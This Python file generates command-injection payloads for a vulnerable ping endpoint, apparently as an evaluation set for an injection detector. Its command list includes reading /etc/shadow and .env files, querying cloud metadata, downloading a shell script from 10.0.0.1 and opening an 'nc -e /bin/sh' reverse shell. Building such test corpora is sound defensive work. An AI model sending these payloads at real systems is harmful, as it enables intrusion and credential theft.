"""Own command-injection payload generator for POST /admin/ping (host
field), independent of the SecLists Fuzzing/command-injection-commix.txt
set used in training (that source's cmdi branch is exactly what leaked into
the first evaluation corpus - see docs/config3b-results.md).

The vulnerable code is:
    exec(`ping -c 3 ${host}`, ...)

Structurally, this generator deliberately does NOT use commix's own style
(a random 6-letter canary + arithmetic identity check wrapped in a
sleep-based timing template, e.g.
`str=$(echo CANARY); str1=${#str}; if [ N -ne ${str1} ]; then sleep 0; else
sleep 1; fi`). Instead it builds conventional, directly-legible attacker
payloads: shell metacharacter separators / substitution operators around a
fixed set of realistic post-exploitation commands. This keeps the
underlying "shape" (after the same CANARY/N normalization used by
training/parsers/parse_seclists_cmdi.py) structurally distinct from the
SecLists corpus, which the exclusion filter also verifies directly
(template-shape check against the raw SecLists file).

Deterministic: same `seed` -> same output list, same order.
"""
from __future__ import annotations

import random
import urllib.parse

HOST = "127.0.0.1"

# Shell separators used to chain a second command after the legitimate
# `ping` invocation, or to substitute output inline.
SEPARATORS = [
    ";", "|", "||", "&&", "&",
    "\n", "%0a",
    "%3b", "%7c", "%26%26", "%26",
    ";;", "|&",
]

# Command substitution / subshell wrappers (payload = HOST + wrapper(cmd)).
SUBSTITUTIONS = [
    lambda cmd: f"`{cmd}`",
    lambda cmd: f"$({cmd})",
    lambda cmd: f";$({cmd})",
    lambda cmd: f"|`{cmd}`",
]

COMMANDS = [
    "cat /etc/passwd",
    "cat /etc/shadow",
    "whoami",
    "id",
    "uname -a",
    "ls -la /",
    "cat /proc/version",
    "cat /app/.env",
    "curl http://169.254.169.254/latest/meta-data/",
    "wget http://10.0.0.1/shell.sh -O /tmp/s.sh",
    "nc -e /bin/sh 10.0.0.1 4444",
    "sleep 5",
    "sleep 10",
    "echo LSG_CMDI_MARKER",
    "printenv",
    "hostname",
    "type C:\\Windows\\win.ini",
    "dir C:\\",
    "net user",
    "powershell -c whoami",
]

COMMENT_SUFFIXES = ["", " #", " //", " %23"]


def _separator_payloads() -> list[str]:
    out = []
    for sep in SEPARATORS:
        for cmd in COMMANDS:
            for suffix in COMMENT_SUFFIXES:
                out.append(f"{HOST}{sep}{cmd}{suffix}")
    return out


def _substitution_payloads() -> list[str]:
    out = []
    for wrap in SUBSTITUTIONS:
        for cmd in COMMANDS:
            out.append(HOST + wrap(cmd))
    return out


def _url_encoded_variant(payload: str) -> str:
    return urllib.parse.quote(payload, safe="")


def generate(seed: int, count: int) -> list[str]:
    rng = random.Random(seed)

    candidates = _separator_payloads() + _substitution_payloads()
    # Add a URL-encoded rendering of a deterministic sample of the plain
    # candidates too, for encoding diversity (a real client submitting an
    # HTML form would urlencode the body anyway, but sqlmap/curl style
    # manual attackers sometimes pre-encode to dodge naive filters).
    encoded_sample = rng.sample(candidates, k=min(80, len(candidates)))
    candidates += [_url_encoded_variant(p) for p in encoded_sample]

    rng.shuffle(candidates)

    out: list[str] = []
    seen: set[str] = set()
    for p in candidates:
        if p in seen:
            continue
        seen.add(p)
        out.append(p)
        if len(out) >= count:
            break
    return out


if __name__ == "__main__":
    payloads = generate(seed=20260923, count=200)
    print(len(payloads))
    for p in payloads[:15]:
        print(" ", repr(p))
